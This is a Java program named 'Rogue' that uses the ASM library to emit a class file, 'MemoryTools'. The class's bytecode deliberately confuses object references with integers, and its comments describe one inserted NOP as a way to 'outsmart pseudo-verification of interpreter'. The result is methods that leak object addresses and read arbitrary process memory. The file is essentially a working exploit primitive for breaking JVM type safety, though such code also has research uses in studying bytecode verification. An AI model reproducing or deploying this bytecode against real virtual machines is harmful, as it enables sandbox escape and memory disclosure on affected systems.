
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.*;
import org.objectweb.asm.*;

public class Rogue implements Opcodes {
	public static void main(String[] args) {
		FileOutputStream fos;
		try {
			fos = new java.io.FileOutputStream("MemoryTools.class");
	        fos.write(dump());
	        fos.close();
		} catch (Exception e) {
			throw new Error(e);
		}
	}
	
	public static byte[] dump () throws Exception {
	
		ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
		FieldVisitor fv;
		MethodVisitor mv;
		AnnotationVisitor av0;
		
		cw.visit(V1_5, ACC_PUBLIC + ACC_SUPER, "MemoryTools", null, "java/lang/Object", null);

		{
			mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
			mv.visitCode();
			Label l0 = new Label();
			mv.visitLabel(l0);
			mv.visitLineNumber(4, l0);
			mv.visitVarInsn(ALOAD, 0);
			mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V");
			mv.visitInsn(RETURN);
			Label l1 = new Label();
			mv.visitLabel(l1);
			mv.visitLocalVariable("this", "LMemoryTools;", null, l0, l1, 0);
			mv.visitMaxs(1, 1);
			mv.visitEnd();
		}
		{
			/*
			 * Treat an object reference (= pointer) as integer
			 */
			mv = cw.visitMethod(ACC_PUBLIC + ACC_STATIC, "addressOfObject", "(Ljava/lang/Object;)I", null, null);
			mv.visitCode();
			mv.visitVarInsn(ALOAD,0);
			mv.visitInsn(NOP); // outsmart pseudo-verification of interpreter
			mv.visitInsn(IRETURN);
			mv.visitMaxs(1, 1);
			mv.visitEnd();
		}
		{
			/*
			 * Read an integer from the memory of the process.
			 * Use the Data class for this purpose. Its assumed memory structure (in x86)
			 * is like this:
			 * structure Data{
			 * 	 int32 hashcode; // offset 0
			 *   void* clazz;    // offset 4
			 *   int x;          // offset 8
			 * }
			 * x can be read with getfield(Data.x), which basically could be represented 
			 * by the following C code:
			 *   char *p;
			 *   int x = *((int*)(p+8))
			 * Therefore, to read an arbitrary memory position, 8 is subtracted from the
			 * address and getfield(Data.x) is called.  
			 */
			mv = cw.visitMethod(ACC_PUBLIC + ACC_STATIC, "readInt", "(I)I", null, null);
			mv.visitCode();
			mv.visitVarInsn(ILOAD,0);
			mv.visitIntInsn(BIPUSH, 8);
			mv.visitInsn(ISUB);
			mv.visitInsn(NOP);
			mv.visitFieldInsn(GETFIELD, "Data", "x", "I");
			mv.visitInsn(IRETURN);
			mv.visitMaxs(1, 1);
			mv.visitEnd();
		}

		cw.visitEnd();

		return cw.toByteArray();
	}
}
